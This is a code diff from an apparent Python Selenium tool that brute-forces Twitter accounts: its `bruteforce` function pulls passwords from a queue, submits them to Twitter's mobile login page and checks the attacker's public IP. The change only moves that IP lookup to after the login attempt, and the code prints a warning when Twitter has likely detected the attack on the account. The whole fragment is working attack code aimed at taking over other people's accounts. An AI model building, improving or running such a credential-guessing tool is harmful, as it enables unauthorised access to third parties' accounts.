@@ -147,11 +147,6 @@ def bruteforce(driver):
     """
     password = PASSWORDS.get()  # get new password from synced queue
 
-    driver.get("http://ip.42.pl/raw")
-    WebDriverWait(driver, 30).until(
-        ec.presence_of_element_located((By.TAG_NAME, "body")))
-    ip = driver.find_element_by_tag_name("body").text
-
     driver.get("https://mobile.twitter.com/session/new")  # load twitter login page in browser
     try:
         # confirm to continue with js disabled (if neccessaray)
@@ -188,7 +183,14 @@ def bruteforce(driver):
     WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
     # get current url
     url = driver.current_url
-    print(url)
+
+    driver.get("http://ip.42.pl/raw")
+    WebDriverWait(driver, 30).until(
+        ec.presence_of_element_located((By.TAG_NAME, "body")))
+
+    # get current IP
+    ip = driver.find_element_by_tag_name("body").text
+
     if "https://mobile.twitter.com/login/check" in url:
         print(R + (
             "   WARNING \t| Twitter probably found out your attacking this account.".format(USERNAME, password)) + W)
